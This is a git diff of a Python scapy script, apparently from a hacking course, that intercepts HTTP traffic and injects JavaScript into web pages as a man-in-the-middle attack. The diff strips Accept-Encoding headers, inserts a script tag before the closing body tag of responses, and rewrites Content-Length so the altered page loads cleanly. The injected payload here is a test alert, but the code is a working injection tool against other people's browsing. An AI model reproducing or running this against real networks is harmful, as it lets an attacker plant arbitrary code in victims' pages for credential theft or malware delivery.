@@ -5,6 +5,7 @@ import re as regex
 # Using regex rule: (?:...). The () means to group and (?:...) means to not capture
 # Thus Content length is separated into two groups, the first group will not be captured
 # and the second group will be captured i.e. the digits that is included in the content length
+# On line 40 we need to put str to convert the new content length into a string
 
 # Defining loader functionality
 def loader(packet, load):
@@ -26,17 +27,19 @@ def spoofed_packet(packets):
             # The old packet will be returned as a string
             # Thus it will decode the response into HTML code
             scapy_loader = regex.sub("Accept-Encoding:.*?\\r\\n", "", scapy_loader)
-
         # Source Port
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
+            code_injection = "<script>alert('test');</script>"
             # Injecting HTML/JavaScript Code in the response field aka the html code of the website
-            scapy_loader = scapy_loader.replace("</body>", "<script>alert('test');</script></body>")
+            scapy_loader = scapy_loader.replace("</body>", code_injection + "</body>")
             search_content_length = regex.search("(?:Content-Length:\s)(\d*)", scapy_loader)
-            if search_content_length:
-                content_length = search_content_length.group(1) # To match the first thing in the whole HTTP Load string
-                print(content_length)
-
+            # Checking if the search content length contains text/html i.e. in the scapy_loader
+            if search_content_length and "text/html" in scapy_loader:
+                content_length = search_content_length.group(1) # To pick the 2nd group in the search_content_length
+                new_content_length = int(content_length) + len(code_injection)
+                # To replace the content_length with new content length and assigning to scapy_loader
+                scapy_loader = scapy_loader.replace(content_length, str(new_content_length))
         # Refactoring
         # Checking if scapy_loader is not equal to the raw layer of the scapy packet then execute the code
         if scapy_loader != scapy_packet[scapy.Raw].load:
